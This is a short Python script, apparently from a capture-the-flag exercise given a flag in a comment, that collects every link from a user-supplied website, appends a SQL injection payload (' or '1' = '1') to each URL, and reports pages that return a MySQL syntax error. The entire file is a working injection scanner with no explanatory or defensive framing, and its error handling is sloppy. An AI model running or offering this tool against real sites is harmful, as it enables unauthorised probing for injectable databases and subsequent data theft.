import requests
import sys
import urllib
import urllib.request
from bs4 import BeautifulSoup
#url = input("please enter url\n")
url = input("please enter your website: ")
r=requests.get(url)
soup = BeautifulSoup(r.content,"html.parser")
spam=[]
j=0
for link in soup.find_all("a"):
    spam.insert(j,link.get("href"))
    j=j+1;  
print(str(j))
i=0
k=0
while (i<j):
    b=spam[i]
    if b[0:3] =='htt':
        try:
                resp=urllib.request.urlopen(b + "=1\' or \'1\' = \'1\'")      
        except:
                k=1
        if k == 1:
                try:
                        resp=urllib.request.urlopen(b + "?id=1" + "=1\' or \'1\' = \'1\'")              
                except:
                        pass
        body=resp.read()
        fullbody=body.decode('utf-8')
        if "You have an error in your SQL syntax" in fullbody:
                print(b)
        else:
            print("NO" + " " + str(i))
    elif b != '#' and  b[0:3]!='htt':
        try:
            resp=urllib.request.urlopen(url + b + "=1\' or \'1\' = \'1\'") 
        except:
            k=1
        if k == 1:
            try:
                resp=urllib.request.urlopen(url + b + "?id=1" + "=1\' or \'1\' = \'1\'")
            except:
                pass
        body=resp.read()
        fullbody=body.decode('utf-8')
        if "You have an error in your SQL syntax" in fullbody:
            print(b)
        else:
            print("NO" + str(i))
    i=i+1
    #flag is iiita_GaMeIsOver
    k=0


        
    
    
    
